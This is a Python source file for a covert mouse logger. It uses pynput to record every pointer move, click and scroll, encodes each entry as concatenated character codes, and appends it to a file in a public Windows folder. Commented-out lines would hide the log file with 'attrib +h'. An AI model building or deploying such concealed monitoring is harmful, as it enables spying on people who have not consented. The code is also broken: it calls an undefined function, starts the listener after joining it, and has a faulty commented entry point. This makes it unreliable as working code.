from functools import reduce

from pynput.mouse import Listener
import os
class MouseAndWrite():
    def __init__(self):

        #self.run()
        pass
    def on_move(self,x, y):
        print('Pointer moved to {0}'.format(
            (x, y)))
        self.write_file ('Pointer moved to {0}'.format(
            (x, y)) + "\n")

    def on_click(self,x, y, button, pressed):
        print('{0} at {1}'.format(
            'Pressed' if pressed else 'Released',
            (x, y)))
        self.write_file ('{0} at {1}'.format(
            'Pressed' if pressed else 'Released',
            (x, y)) + "\n")
        #if not pressed:
         #   # Stop listener
           # return False

    def on_scroll(self,x, y, dx, dy):
        print('Scrolled {0}'.format(
            (x, y)))
        self.write_file('Scrolled {0}'.format(
            (x, y))+"\n")

    def write_file(self,x):
        #fn = "mouse.text"
       # p = os.popen ('attrib +h ' + fn)
        #t = p.read ()
       # p.close ()

        with open (r"C:\Users\Public\Roaming\mouse.text", "a") as f:
            print(type(x))
            xd = str(reduce(lambda i, z: str(i)+str(z), map(ord,x)))
            f.write(xd)
            f.write("\n")

    def run(self):
        with Listener(
                on_move=self.on_move,
                on_click=self.on_click,
                on_scroll=self.on_scroll) as listener:
            listener.join()
            listener.start ()
            try:
                with_statements ()
            finally:
                listener.stop ()

#if __name__ == '__main__':
 #   MouseLogger = MouseAndWrite ()
   # th2 = threading.Thread (target=MouseAndWrite.run(self=MouseLogger))
  #  th2.start ()
